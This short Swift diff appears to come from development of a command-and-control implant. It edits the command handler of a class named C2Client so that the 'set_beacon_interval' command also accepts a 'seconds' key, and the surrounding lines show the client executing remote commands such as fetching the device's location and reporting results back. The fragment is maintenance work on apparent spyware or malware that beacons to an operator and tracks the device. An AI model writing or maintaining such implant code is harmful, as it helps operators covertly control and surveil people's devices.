@@ -115,7 +115,7 @@ class C2Client {
                 executeGetLocation(commandId: commandId)
                 
             case "set_beacon_interval":
-                if let interval = command["interval"] as? TimeInterval {
+                if let interval = command["seconds"] as? TimeInterval ?? command["interval"] as? TimeInterval {
                     beaconInterval = interval
                     startBeaconLoop()
                     reportResult(commandId: commandId, status: "success", data: ["interval": interval])
